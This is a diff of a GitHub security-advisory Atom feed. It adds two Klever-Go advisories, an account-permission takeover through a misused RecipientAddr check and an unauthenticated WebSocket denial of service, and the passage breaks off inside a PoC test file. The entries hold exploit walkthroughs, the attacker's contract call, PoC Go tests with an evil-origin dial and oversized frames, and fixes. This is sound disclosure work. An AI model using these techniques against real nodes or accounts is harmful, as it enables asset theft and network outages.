@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-09-23T17:32:53.520Z</updated>
+    <updated>2026-09-23T20:48:23.488Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,859 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/klever-io/klever-go] Klever-Go Account takeover: `kleverUpdateAccountPermission` authorizes on attacker-controlled `RecipientAddr` instead of the authenticated caller]]></title>
+        <id>https://github.com/advisories/GHSA-97cv-x867-6xhm</id>
+        <link href="https://github.com/advisories/GHSA-97cv-x867-6xhm"/>
+        <updated>2026-09-23T19:27:09.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="description">Description</h3>
+<p>The VM built-in function <code>KleverUpdateAccountPermission</code> (registered always-active, <code>creator.go:381-390</code> / <code>core/vmconstants.go:234</code>) rewrites an account's entire permission set. Its authorization check uses <code>vmInput.RecipientAddr</code> <strong>attacker-controlled</strong>  instead of the authenticated <code>vmInput.CallerAddr</code>. The sibling handler <code>kleverChangeOwnerAddress.go:86</code> uses <code>vmInput.CallerAddr</code> correctly, so the safe pattern exists in-repo; this handler deviates. The native transaction path (<code>txProcess.go:833</code>) is safe  it uses <code>tx.GetSender()</code>.</p>
+<p>Mechanism:</p>
+<ol>
+<li><strong>Wrong variable:</strong> <code>CallerAddr</code> is never referenced in the handler; auth is <code>contractHasValidPermission(target.GetPermissions(), RecipientAddr)</code>, which returns true if <code>RecipientAddr</code> is a signer with <code>Weight &gt;= Threshold</code> in the <em>target</em> account's permissions and the permission grants <code>UpdateAccountPermissionContractType</code>.</li>
+<li><strong>RecipientAddr is attacker-controlled:</strong> when a contract calls a built-in via <code>ExecuteOnDestContextWithTypedArgs</code> (<code>baseOps.go:1967</code>), <code>prepareIndirectContractCallInput</code> (<code>baseOps.go:2485</code>) sets <code>RecipientAddr = destination</code> (contract-chosen) and <code>CallerAddr = the calling contract</code>. The blockchain hook (<code>blockChainHook.go:454/467</code>) dispatches on <code>input.Function</code> and passes the input through unchanged; no guard forces <code>RecipientAddr == CallerAddr</code> and there is no SC-destination validation on this path.</li>
+<li><strong>Self-signer default satisfies the check:</strong> <code>createDefaultOwnerPermission</code> (<code>accounts.go:1848</code>) makes an account its own signer (weight 1, threshold 1, Owner type), and <code>CheckPermissionGrantedForContracts</code> returns true for Owner, so <code>contractHasValidPermission(V.perms, V) == true</code>. (More generally, <code>RecipientAddr</code> can be set to <em>any</em> of V's signer addresses meeting threshold all public on-chain.) Accounts with no stored permissions have empty <code>GetPermissions()</code> and are immune.</li>
+<li><strong>Overwrite is unrestricted:</strong> <code>UpdatePermission(V, attackerContract)</code> (<code>accounts.go:1863</code>) replaces V's permission set with attacker-supplied signers; if the attacker supplies an Owner-type permission, no default is appended and V's prior control is fully evicted.</li>
+</ol>
+<h3 id="code-walkthrough">Code walkthrough</h3>
+<p><strong>(a) The vulnerable handler</strong> — <code>core/kapp/builtInFunctions/kleverUpdateAccountPermission.go</code>:</p>
+<pre><code class="language-go">func (e *kleverUpdateAccountPermission) ProcessBuiltinFunction(vmInput *vmcommon.ContractCallInput) (*vmcommon.VMOutput, error) {
+    ...
+    address := vmInput.NextArg()                       // Arguments[0] — attacker-chosen target account V
+    contract, err := e.getUpdateAccountPermissionContract(vmInput) // Arguments[1] — attacker-chosen new permissions
+    ...
+    acc, err := e.accountsCacher.LoadUser(address)      // loads V
+    ...
+    // BUG: authorizes against vmInput.RecipientAddr (attacker-controlled), NOT vmInput.CallerAddr
+    if !e.contractHasValidPermission(acc.GetPermissions(), vmInput.RecipientAddr) {   // L91
+        return nil, errors.New("invalid permission operation")
+    }
+    // overwrites V's entire permission set with attacker-supplied signers
+    resultCode, err := e.kappController.GetAccountsKApp().UpdatePermission(address, contract)
+    ...
+}
+</code></pre>
+<p><strong>(b) The check just name-matches <code>recipientAddr</code> against V's own signers</strong> — same file:</p>
+<pre><code class="language-go">func (e *kleverUpdateAccountPermission) contractHasValidPermission(permissions []*state.Permission, recipientAddr []byte) bool {
+    for _, permission := range permissions {
+        for _, signer := range permission.Signers {
+            if !bytes.Equal(signer.Address, recipientAddr) {   // recipientAddr, not the authenticated caller
+                continue
+            }
+            if signer.Weight &gt;= permission.Threshold &amp;&amp;
+                permission.CheckPermissionGrantedForContracts(transaction.TXContract_UpdateAccountPermissionContractType) {
+                return true
+            }
+        }
+    }
+    return false
+}
+</code></pre>
+<p><strong>(c) The dispatch makes <code>RecipientAddr</code> attacker-controlled</strong> — <code>kvm/vmhost/vmhooks/baseOps.go:2464</code> <code>prepareIndirectContractCallInput</code> (invoked when a contract calls the built-in via <code>ExecuteOnDestContext</code>):</p>
+<pre><code class="language-go">contractCallInput := &amp;vmcommon.ContractCallInput{
+    VMInput: vmcommon.VMInput{
+        CallerAddr: sender,        // the calling contract (authenticated) — NOT used by the handler
+        Arguments:  data,          // attacker-chosen: [V, attackerPermissions]
+        ...
+    },
+    RecipientAddr: destination,    // the contract's chosen `dest` argument — attacker sets this to V
+    Function:      string(function),
+}
+</code></pre>
+<p><strong>(d) Every account with configured permissions is its own signer</strong> — <code>core/kapp/accounts/accounts.go:1848</code> <code>createDefaultOwnerPermission</code> (appended by <code>UpdatePermission</code> when no Owner permission is supplied):</p>
+<pre><code class="language-go">return &amp;state.Permission{
+    Type:      state.Permission_Owner,   // Owner grants ALL contract types incl. type 22
+    Threshold: 1,
+    Signers: []*state.Key{
+        { Address: ownerAcc.AddressBytes(), Weight: 1 },   // the account signs for itself
+    },
+}
+</code></pre>
+<p>So <code>contractHasValidPermission(V.perms, RecipientAddr=V)</code> finds V's own address as a <code>Weight 1 &gt;= Threshold 1</code> Owner signer → returns <code>true</code>.</p>
+<p><strong>(e) Contrast — the sibling handler does it correctly</strong> — <code>core/kapp/builtInFunctions/kleverChangeOwnerAddress.go:86</code>:</p>
+<pre><code class="language-go">callerAddress := vmInput.CallerAddr                        // authenticated caller
+...
+if !bytes.Equal(callerAddress, acc.GetOwnerAddress()) {    // checks the CALLER, not RecipientAddr
+    return nil, ErrOperationNotPermitted
+}
+</code></pre>
+<p><strong>Putting it together — the attacker's contract call:</strong></p>
+<pre><code>ExecuteOnDestContext(
+    gas, dest = V,                       // → RecipientAddr = V
+    value = 0,
+    function = "KleverUpdateAccountPermission",
+    args = [ V, attackerOwnerPermsWithOnlyAttackerKey ],   // Arguments[0]=V, Arguments[1]=new perms
+)
+</code></pre>
+<p>→ <code>CallerAddr = attackerContract</code> (ignored), <code>RecipientAddr = V</code>, <code>contractHasValidPermission(V.perms, V) == true</code> → V's permissions overwritten with the attacker's key as sole Owner signer. The attacker never held a key of V and provided no signature from V.</p>
+<h3 id="poc">POC</h3>
+<p>put the following poc testcase under /core/kapp/builtInFunctions/ </p>
+<p>POC Code: <a href="https://gist.github.com/mabdullah22/a41f90aa5ba86bbebf121f739bd5f5e9">https://gist.github.com/mabdullah22/a41f90aa5ba86bbebf121f739bd5f5e9</a></p>
+<p>Run:</p>
+<pre><code>cd klever-go
+GOTOOLCHAIN=auto go test ./core/kapp/builtInFunctions/ -run TestPoC_PermTakeover -v
+</code></pre>
+<p>Output:</p>
+<pre><code>TAKEOVER CONFIRMED: caller="attacker-contract" (attacker SC) rewrote account V="victim-account-V"; new sole owner signer="attacker-key-EVIL"
+--- PASS: TestPoC_PermTakeover
+--- PASS: TestPoC_PermTakeover_NoStoredPermsIsSafe
+</code></pre>
+<p>The harm asserted is the takeover itself: after the call, V's permission set is a single Owner permission whose sole signer is the attacker's key; V's original owner signer is gone.</p>
+<h3 id="impact">Impact</h3>
+<p>Full takeover of <strong>any account that has configured permissions</strong>  i.e. every multisig / advanced-permission account , by an attacker who deploys a cheap smart contract and supplies only public on-chain addresses (no keys, no signatures from the victim). After takeover the attacker controls all of the victim's operations → theft or permanent lock of all the account's assets. Reachable via a permissionlessly-deployed contract (the plain-tx path is safe, so it is Critical-via-contract, not fully no-contract). No fork flag gates it.</p>
+<p>Severity <strong>Critical</strong>: Impact High (full account/asset compromise)</p>
+<h3 id="recommendation">Recommendation</h3>
+<p>Authorize against the authenticated caller, mirroring <code>kleverChangeOwnerAddress</code>:</p>
+<pre><code class="language-go">if !e.contractHasValidPermission(acc.GetPermissions(), vmInput.CallerAddr) { ... }
+</code></pre>
+<p>Reconcile the SC-call authority model: on the built-in path <code>CallerAddr</code> is the calling contract, so a contract should only be able to update permissions of accounts that legitimately list <em>it</em> as an authorized signer — never an arbitrary victim. Consider also requiring the target account (<code>Arguments[0]</code>) to equal the authorized caller's account, matching the native <code>tx.GetSender()</code> model.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/klever-io/klever-go/security/advisories/GHSA-97cv-x867-6xhm">https://github.com/klever-io/klever-go/security/advisories/GHSA-97cv-x867-6xhm</a></li>
+<li><a href="https://github.com/klever-io/klever-go/commit/c58740eb74d7ee8f07db1e18a7d6214b5559ba32">https://github.com/klever-io/klever-go/commit/c58740eb74d7ee8f07db1e18a7d6214b5559ba32</a></li>
+<li><a href="https://gist.github.com/mabdullah22/a41f90aa5ba86bbebf121f739bd5f5e9">https://gist.github.com/mabdullah22/a41f90aa5ba86bbebf121f739bd5f5e9</a></li>
+<li><a href="https://github.com/klever-io/klever-go/releases/tag/v1.7.20">https://github.com/klever-io/klever-go/releases/tag/v1.7.20</a></li>
+<li><a href="https://github.com/advisories/GHSA-97cv-x867-6xhm">https://github.com/advisories/GHSA-97cv-x867-6xhm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-97cv-x867-6xhm</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-23T19:27:08.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/klever-io/klever-go] Klever-Go: Unauthenticated WebSocket /subscribe: no read-size limit, no connection cap, permissive origin -> remote node memory/goroutine exhaustion (DoS)]]></title>
+        <id>https://github.com/advisories/GHSA-4fwh-wrm6-97xm</id>
+        <link href="https://github.com/advisories/GHSA-4fwh-wrm6-97xm"/>
+        <updated>2026-09-23T19:16:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The unauthenticated WebSocket endpoint <code>GET /subscribe</code> is registered <code>open: true</code> by default
+(<code>config/node/api.yaml</code>) and lets a remote, unauthenticated client exhaust the node's memory and
+goroutines. Because the REST API runs IN-PROCESS with the node — <code>network/api/api.go</code> <code>Start(...)</code>
+ends with <code>ws.Run(kleverFacade.RestAPIInterface())</code> — exhausting/killing the API process takes down
+the entire node, including its P2P and consensus participation. No API key, account, stake, or funds
+are required.</p>
+<p>Three compounding, independently-exploitable gaps stack on this one endpoint:</p>
+<ol>
+<li>Permissive origin — <code>upgrader.CheckOrigin</code> always returns <code>true</code>
+(<code>network/api/websocket/routes.go</code>), so any web origin can complete the handshake.</li>
+<li>No read-size limit — the connection never calls <code>conn.SetReadLimit(...)</code>. gorilla's default is
+UNLIMITED, so a single <code>conn.ReadJSON</code> (<code>processSubscription</code>) or <code>conn.ReadMessage</code>
+(<code>client.loopIn</code>) can be forced to allocate an arbitrarily large buffer from ONE frame.</li>
+<li>No connection / fan-out cap — the gin global throttler (<code>simultaneousRequests: 100</code>) releases its
+slot as soon as <code>handleSubscribe</code> returns, which it does immediately after
+<code>go processSubscription(conn, hub)</code>. Live WebSocket connections are therefore NOT counted by it.
+There is no per-IP / per-connection / hub-level cap. Each accepted connection spawns 2 goroutines
+plus a 500-entry buffered channel, and <code>req.Addresses</code> has no length cap, so the hub's
+<code>addressSubscription</code> map grows 1:1 with attacker-supplied strings.</li>
+</ol>
+<h2 id="affected-component--code-path">Affected Component / Code Path</h2>
+<p>Unauthenticated, reachable by default, no recovery on the resource-allocation path:</p>
+<pre><code>gin engine (network/api/api.go: Start -&gt; ws.Run, IN-PROCESS with node)
+ -&gt; GET /subscribe                              network/api/websocket/routes.go:34  (SubscribeTopics)
+   -&gt; handleSubscribe                            network/api/websocket/routes.go:39
+     -&gt; upgrader.Upgrade  (CheckOrigin == true)  network/api/websocket/routes.go:22  &lt;-- GAP #1
+     -&gt; go processSubscription(conn, hub)         network/api/websocket/routes.go:46  (throttler slot freed here)
+        -&gt; conn.ReadJSON(&amp;req)  (no SetReadLimit) network/api/websocket/routes.go:57  &lt;-- GAP #2
+        -&gt; hub.HandleClientInsertion(...)         websocket/websocket.go:121          &lt;-- GAP #3 (addresses uncapped)
+           -&gt; websocket.NewClient -&gt; loopIn/loopOut (2 goroutines + 500-buf chan per conn)  websocket/client.go:24
+              -&gt; conn.ReadMessage()  (no SetReadLimit, no deadline)  websocket/client.go:77  &lt;-- GAP #2
+</code></pre>
+<p>Root-cause excerpts (commit <code>23b74e1</code>):</p>
+<p><code>network/api/websocket/routes.go</code></p>
+<pre><code class="language-go">var upgrader = gorilla.Upgrader{
+    CheckOrigin: func(r *http.Request) bool {
+        return true                      // GAP #1: any origin accepted
+    },
+}
+
+func handleSubscribe(c *gin.Context, hub *websocket.SocketHub) {
+    conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
+    if err != nil {
+        log.Error(subscribeOp, "err", err.Error())
+        return
+    }
+    go processSubscription(conn, hub) // returns now -&gt; gin global throttler slot released (GAP #3)
+}
+
+func processSubscription(conn *gorilla.Conn, hub *websocket.SocketHub) {
+    // no conn.SetReadLimit(...) anywhere (GAP #2)
+    _ = conn.SetReadDeadline(time.Now().Add(subscribeReadTimeout))
+    var req subscribeRequest
+    if err := conn.ReadJSON(&amp;req); err != nil { ... }      // unbounded read
+    _ = conn.SetReadDeadline(time.Time{})                  // deadline cleared
+    ...
+    client := websocket.NewClient(conn, hub)
+    hub.HandleClientInsertion(parsedTypes, req.Addresses, client) // req.Addresses uncapped (GAP #3)
+}
+</code></pre>
+<p><code>websocket/websocket.go</code> — <code>HandleClientInsertion</code> inserts every address with no length cap:</p>
+<pre><code class="language-go">for _, address := range addresses {
+    if _, ok := h.addressSubscription[address]; !ok {
+        h.addressSubscription[address] = make(map[*client]userOptions) // grows 1:1 with attacker input
+    }
+    ...
+}
+</code></pre>
+<p><code>websocket/client.go</code> — <code>loopIn</code> reads with no size limit and no deadline:</p>
+<pre><code class="language-go">for {
+    messageType, message, err := c.conn.ReadMessage() // GAP #2: unbounded, no SetReadLimit
+    ...
+}
+</code></pre>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>The node's REST API must be reachable by the attacker. Two realistic deployment shapes:<ul>
+<li>(a) Operator-exposed API — <code>--rest-api-interface :8080</code> / <code>0.0.0.0:8080</code>. This is the standard
+configuration for public RPC and observer infrastructure (the kind Klever itself operates at
+<code>node.klever.org</code> / <code>api.klever.org</code>). Here the attacker reaches <code>/subscribe</code> directly over the
+network with no further conditions.</li>
+<li>(b) Cross-origin browser drive-by — default bind is <code>localhost:8080</code>
+(<code>common/facade/nodeFacade.go</code> <code>DefaultRestInterface = "localhost:8080"</code>). Because
+<code>CheckOrigin</code> returns <code>true</code> (GAP #1), any website an operator visits can open
+<code>ws://localhost:8080/subscribe</code> from the victim's browser and drive GAP #2 (single oversized
+frame) and GAP #3 (many connections) without the API being network-exposed at all.</li>
+</ul>
+</li>
+<li><code>/subscribe</code> is <code>open: true</code> in the default <code>config/node/api.yaml</code>; <code>isSubscriptionRouteEnabled</code>
+returns true and the route + hub are wired unconditionally in <code>RegisterRoutes</code>.</li>
+<li><code>/subscribe</code> is NOT listed in <code>endpointsThrottlers</code> (<code>config/node/config.yaml</code>), so it has no
+per-endpoint goroutine cap.</li>
+<li>No authentication, no on-chain account, no stake, no attacker-created asset is required.</li>
+</ul>
+<h2 id="impact-distributed-by-gap-and-by-blast-radius">Impact (distributed by gap and by blast radius)</h2>
+<p>This single finding produces several distinct impacts because the three gaps amplify different
+node resources and reach the node through two different exposure models. They are broken out so the
+remediation owner can scope each one.</p>
+<h3 id="impact-a--single-frame-heap-exhaustion-gap-2-the-cleanest-primitive">Impact A — Single-frame heap exhaustion (GAP #2, the cleanest primitive)</h3>
+<ul>
+<li>One unauthenticated connection sends ONE WebSocket frame; with no <code>SetReadLimit</code>, gorilla buffers
+the entire frame in memory before the JSON is even parsed. Frame size scales the allocation
+linearly, so one connection can drive a multi-GB allocation.</li>
+<li>Observed amplification: an 8 MiB frame grows the server heap by <del>32 MiB (</del>4x) while buffering ONE
+attacker frame (decode/UTF-8/scratch overhead on top of the raw bytes).</li>
+<li>No flood and no rate-limit interaction is needed: the source throttler is a per-IP RATE cap on
+HTTP handshakes, not a size or memory cap, so a single slow connection streaming one oversized
+message is not meaningfully throttled.</li>
+<li>Result: OOM-kill of the node process from a single connection.</li>
+</ul>
+<h3 id="impact-b--connection--goroutine-exhaustion-gap-3-fan-out">Impact B — Connection / goroutine exhaustion (GAP #3, fan-out)</h3>
+<ul>
+<li>Live WS connections are not counted by the gin global throttler (its slot is freed at the
+HTTP→WS upgrade), and there is no per-IP or hub-level connection cap.</li>
+<li>Each accepted connection costs 2 goroutines + a 500-entry buffered channel. Connection count grows
+linearly with attacker effort from a single source, with no ceiling.</li>
+<li>Result: goroutine/descriptor/scheduler exhaustion → node slowdown then OOM/crash.</li>
+</ul>
+<h3 id="impact-c--unbounded-subscription-map-growth-gap-3-per-connection-memory">Impact C — Unbounded subscription-map growth (GAP #3, per-connection memory)</h3>
+<ul>
+<li><code>req.Addresses</code> is uncapped, and <code>HandleClientInsertion</code> inserts every entry into the hub's
+<code>addressSubscription</code> map. ONE connection submitting N attacker-controlled address strings grows
+the map to exactly N entries (1:1), independent of how many real on-chain addresses exist.</li>
+<li>Result: heap growth driven purely by attacker-chosen strings on a single connection; combinable
+with Impact B (many connections × many addresses) for multiplicative memory pressure.</li>
+</ul>
+<h3 id="impact-d--cross-origin-reach-to-localhost-bound-nodes-gap-1-exposure-amplifier">Impact D — Cross-origin reach to localhost-bound nodes (GAP #1, exposure amplifier)</h3>
+<ul>
+<li>Because <code>CheckOrigin</code> is always <code>true</code>, Impacts A–C are reachable from a victim's browser even
+when the API is bound to <code>localhost</code> and never exposed to the network. A node operator who simply
+visits a malicious page can have their own node driven into Impact A/B/C from inside their browser.</li>
+<li>Result: the <code>localhost</code>-bind "mitigation" does not hold against a web-drive-by attacker.</li>
+</ul>
+<h3 id="blast-radius-note-applies-to-all-of-the-above">Blast-radius note (applies to all of the above)</h3>
+<ul>
+<li>The REST/WS API runs in the SAME process as the node (<code>ws.Run(...)</code> in <code>network/api/api.go</code>).
+OOM/kill of the API = loss of P2P + consensus participation for that node, not merely loss of the
+RPC surface. For a public RPC/observer node this is an availability break for every downstream
+wallet/explorer/service; repeated across many nodes it degrades overall network availability.</li>
+</ul>
+<h2 id="exploit-cost--attack-complexity">Exploit Cost / Attack Complexity</h2>
+<ul>
+<li>Cost: negligible. No funds, no stake, no account, no API key. One TCP/WS connection (Impact A) or a
+modest number of connections (Impact B/C). Impact D needs only that the operator visits a web page.</li>
+<li>Complexity: LOW. Unauthenticated, remote, deterministic. The vulnerability is the ABSENCE of caps,
+so it does not depend on a race or on a specific node version beyond the affected range.</li>
+</ul>
+<h2 id="poc-result">PoC-Result</h2>
+<p>Two complementary PoCs were executed against the REAL production code at commit <code>23b74e1</code>.
+All runs PASS. Sources, scenarios, and run instructions are in PoC-Source below.</p>
+<h3 id="result-1--unit-poc-unbounded-addresssubscription-growth-impact-c">Result 1 — Unit PoC: unbounded <code>addressSubscription</code> growth (Impact C)</h3>
+<p>Drives the real <code>SocketHub.HandleClientInsertion</code> (production code, no stub) with one client
+submitting 200,000 attacker-controlled address strings.</p>
+<pre><code>$ go test ./websocket/ -run TestPoC_UnboundedAddressSubscriptionGrowth -v
+=== RUN   TestPoC_UnboundedAddressSubscriptionGrowth
+    zz_poc_ws_unbounded_subscription_test.go:46: addressSubscription entries after ONE client submitted 200000 addresses: 200000
+    zz_poc_ws_unbounded_subscription_test.go:50: VULNERABLE: no cap on per-connection address count
+--- PASS: TestPoC_UnboundedAddressSubscriptionGrowth (0.09s)
+PASS
+ok  	github.com/klever-io/klever-go/websocket	0.092s
+</code></pre>
+<p>Interpretation: one connection → 200,000 hub map entries (1:1), confirming GAP #3 / Impact C with
+no cap. Scaling the address count scales the allocation.</p>
+<h3 id="result-2--end-to-end-poc-all-three-gaps-over-a-real-loopback-gin--gorilla-ws-server-impacts-a-b-d">Result 2 — End-to-end PoC: all three gaps over a real loopback gin + gorilla WS server (Impacts A, B, D)</h3>
+<p>Runs the REAL <code>network/api/websocket.SubscribeTopics</code> + <code>websocket.NewHub</code> + <code>hub.StartServer</code>
+behind a gin server on <code>127.0.0.1</code>, driven by a real gorilla WebSocket client, with a "hardened"
+A/B control (strict <code>CheckOrigin</code> + <code>SetReadLimit(1 MiB)</code>) to prove each missing control is the cause.</p>
+<pre><code>$ go test ./network/api/websocket/ -run TestE2E_Gap -v
+=== RUN   TestE2E_Gap1_EvilOriginAccepted
+    zz_e2e_ws_dos_test.go:87: GAP#1 CONFIRMED: real /subscribe accepted Origin=https://evil.attacker.example (HTTP 101)
+    zz_e2e_ws_dos_test.go:94: control: hardened handler rejected evil origin (HTTP 403) as expected
+--- PASS: TestE2E_Gap1_EvilOriginAccepted (0.00s)
+=== RUN   TestE2E_Gap2_NoReadSizeLimit
+    zz_e2e_ws_dos_test.go:118: control: hardened handler rejected 8388608-byte frame with close 1009 (read limit works)
+    zz_e2e_ws_dos_test.go:147: GAP#2 CONFIRMED: real /subscribe accepted an 8388608-byte (8 MiB) frame with NO size limit (no close 1009; read err=read tcp ... i/o timeout). Server heap grew ~32 MiB while buffering one attacker frame.
+--- PASS: TestE2E_Gap2_NoReadSizeLimit (1.43s)
+=== RUN   TestE2E_Gap3_NoConnectionCap
+    zz_e2e_ws_dos_test.go:185: GAP#3 CONFIRMED (conn level): real /subscribe accepted ALL 300 concurrent connections from one client with NO cap (global throttler=100 not enforced on live WS). Server goroutines grew 4 -&gt; 604 (~2 per conn).
+--- PASS: TestE2E_Gap3_NoConnectionCap (0.43s)
+PASS
+ok  	github.com/klever-io/klever-go/network/api/websocket	1.866s
+</code></pre>
+<p>Interpretation:</p>
+<ul>
+<li>GAP #1 (Impact D): the real handler completes the handshake (HTTP 101) for
+<code>Origin: https://evil.attacker.example</code>; the hardened control returns HTTP 403. → cross-origin
+drive-by reach, including to localhost-bound nodes.</li>
+<li>GAP #2 (Impact A): one unauthenticated connection sends a single 8 MiB frame; the real server
+buffers it whole (~32 MiB heap, ~4x amplification, NO close 1009). The 1 MiB-capped control rejects
+it with close 1009. → one connection scales to a multi-GB allocation.</li>
+<li>GAP #3 (Impact B): 300 &gt; the configured global cap of 100 simultaneous requests were ALL accepted
+as live connections; goroutines grew 4 → 604 (~2 per connection). → the global throttler does not
+bound live WS connections; growth is linear and uncapped.</li>
+</ul>
+<h3 id="production-safety-note-on-the-poc">Production-safety note on the PoC</h3>
+<p>Frame size (8 MiB) and connection count (300) are kept deliberately modest so the test host is not
+OOM-killed. The vulnerability is the ABSENCE of the read-size / connection / origin controls, which
+the hardened A/B control proves fixes each gap. Full end-to-end OOM (multi-GB frame / connection
+flood) is intentionally NOT executed against any production node.</p>
+<h2 id="poc-source">PoC-Source</h2>
+<p>Two self-contained Go tests reproduce the finding against the unmodified production code. Both use
+only the repo's own <code>go.mod</code> dependencies (gin + gorilla, already required) and the real
+<code>network/api/websocket</code> + <code>websocket</code> packages. No external services.</p>
+<h3 id="scenario">Scenario</h3>
+<ul>
+<li>PoC 1 (unit, Impact C) targets the hub primitive directly: build one in-process <code>client</code>, call the
+REAL <code>SocketHub.HandleClientInsertion</code> with 200,000 attacker-controlled address strings, and assert
+the hub's <code>addressSubscription</code> map grows 1:1 (no cap). This isolates GAP #3 / Impact C with zero
+network setup.</li>
+<li>PoC 2 (end-to-end, Impacts A/B/D) stands up the REAL handler: <code>gin.New()</code> + the production
+<code>wsapi.SubscribeTopics(engine, hub)</code> + <code>websocket.NewHub(...)</code> + <code>hub.StartServer(ctx)</code> on a
+<code>127.0.0.1:0</code> listener, then drives it with a real gorilla WS client. A "hardened" mirror server
+(strict <code>CheckOrigin</code> + <code>SetReadLimit(1 MiB)</code>) is the A/B control that proves each missing control
+is the root cause:<ul>
+<li>Gap1 test: dial with <code>Origin: https://evil.attacker.example</code>; real accepts (HTTP 101), control rejects (403).</li>
+<li>Gap2 test: send one 8 MiB valid subscribe frame; real buffers it (no close 1009, heap grows ~32 MiB),
+control closes with 1009 (message too big).</li>
+<li>Gap3 test: open 300 concurrent connections from one client; real accepts all (goroutines grow ~2/conn),
+proving the gin global cap of 100 is not enforced on live WS.</li>
+</ul>
+</li>
+</ul>
+<h3 id="how-to-run">How to run</h3>
+<ol>
+<li><code>git clone https://github.com/klever-io/klever-go &amp;&amp; cd klever-go</code>
+(Go toolchain matching <code>go.mod</code>; verified locally on go1.26.3 at commit <code>23b74e1</code>.)</li>
+<li>Save PoC 1 as <code>websocket/poc_ws_unbounded_subscription_test.go</code> and run:
+<code>go test ./websocket/ -run TestPoC_UnboundedAddressSubscriptionGrowth -v</code></li>
+<li>Save PoC 2 as <code>network/api/websocket/e2e_ws_dos_test.go</code> and run:
+<code>go test ./network/api/websocket/ -run TestE2E_Gap -v</code>
+(The three <code>TestE2E_Gap*</code> subtests can run together; each starts its own loopback server.)</li>
+</ol>
+<ul>
+<li>Production-safety: frame size (8 MiB) and connection count (300) are intentionally small so the
+runner is not OOM-killed; they demonstrate the missing caps, not a live OOM. Do NOT point these at
+a production node.</li>
+</ul>
+<h3 id="full-poc-source-1--websocketpoc_ws_unbounded_subscription_testgo">Full PoC source 1 — <code>websocket/poc_ws_unbounded_subscription_test.go</code></h3>
+<pre><code class="language-go">// Target component:    klever-go REST/WebSocket API — unauthenticated /subscribe (network/api/websocket, websocket/)
+// Vulnerability type:  Uncontrolled resource consumption (CWE-770) — unauthenticated remote
+//                      memory/goroutine exhaustion of the node process via the WS API.
+// Scope note:          The REST API runs IN-PROCESS with the node, so OOM kills the whole node
+//                      (P2P + consensus), not a separate sidecar.
+//
+// Three compounding gaps on the unauthenticated `/subscribe` endpoint (open:true by default):
+//   1) gorilla Upgrader has CheckOrigin -&gt; always true (any origin).
+//   2) NO conn.SetReadLimit: a single WS frame/JSON can be arbitrarily large -&gt; one message
+//      can force a multi-GB allocation in conn.ReadJSON / ReadMessage.
+//   3) NO connection cap (per-IP / global / hub-level): the gin global throttler slot is
+//      released right after the HTTP-&gt;WS upgrade in handleSubscribe (it returns immediately
+//      after `go processSubscription`), so live WS connections are NOT counted by the
+//      100-simultaneous-request cap. Each connection also spawns 2 goroutines + a 500-buffered
+//      channel, and there is no per-connection cap on req.Addresses, so the hub's
+//      addressSubscription map grows 1:1 with attacker-supplied strings.
+//
+// This test runtime-confirms gap #3 (unbounded addressSubscription growth). Gaps #1/#2 are
+// verified by code review (no SetReadLimit / CheckOrigin==true in network/api/websocket/routes.go).
+//
+// How to run: cp into websocket/ and `go test ./websocket/ -run TestPoC_UnboundedAddressSubscriptionGrowth -v`
+package websocket
+
+import (
+    "fmt"
+    "testing"
+
+    "github.com/klever-io/klever-go/indexer"
+)
+
+func TestPoC_UnboundedAddressSubscriptionGrowth(t *testing.T) {
+    hub := NewHub("", "", nil)
+    c := &amp;client{hub: hub, out: make(chan interface{}, 10), alive: true, sem: make(chan struct{}, maxWorkers)}
+
+    const n = 200000
+    addresses := make([]string, n)
+    for i := 0; i &lt; n; i++ {
+        addresses[i] = fmt.Sprintf("klv-attacker-addr-%d", i)
+    }
+    hub.HandleClientInsertion([]indexer.EventType{indexer.ACCOUNTS}, addresses, c)
+
+    hub.mu.RLock()
+    got := len(hub.addressSubscription)
+    hub.mu.RUnlock()
+
+    t.Logf("addressSubscription entries after ONE client submitted %d addresses: %d", n, got)
+    if got != n {
+        t.Fatalf("expected unbounded growth to %d, got %d", n, got)
+    }
+    t.Logf("VULNERABLE: no cap on per-connection address count")
+}
+</code></pre>
+<h3 id="full-poc-source-2--networkapiwebsockete2e_ws_dos_testgo">Full PoC source 2 — <code>network/api/websocket/e2e_ws_dos_test.go</code></h3>
+<pre><code class="language-go">package websocket_test
+
+import (
+    "context"
+    "net"
+    "net/http"
+    "runtime"
+    "strings"
+    "testing"
+    "time"
+
+    "github.com/gin-gonic/gin"
+    gorilla "github.com/gorilla/websocket"
+
+    wsapi "github.com/klever-io/klever-go/network/api/websocket"
+    hubpkg "github.com/klever-io/klever-go/websocket"
+)
+
+// ---- vulnerable server: the REAL production handler ----
+func startRealSubscribeServer(t *testing.T) (string, func()) {
+    t.Helper()
+    gin.SetMode(gin.ReleaseMode)
+    engine := gin.New()
+    hub := hubpkg.NewHub("", "", nil) // facade nil: /subscribe path doesn't use it
+    ctx, cancel := context.WithCancel(context.Background())
+    go hub.StartServer(ctx)
+    wsapi.SubscribeTopics(engine, hub) // &lt;-- REAL production registration
+
+    ln, err := net.Listen("tcp", "127.0.0.1:0")
+    if err != nil {
+        t.Fatal(err)
+    }
+    srv := &amp;http.Server{Handler: engine}
+    go func() { _ = srv.Serve(ln) }()
+    stop := func() { cancel(); _ = srv.Close(); _ = ln.Close() }
+    return ln.Addr().String(), stop
+}
+
+// ---- hardened mirror: same flow + the missing controls (strict origin + SetReadLimit) ----
+func startHardenedSubscribeServer(t *testing.T) (string, func()) {
+    t.Helper()
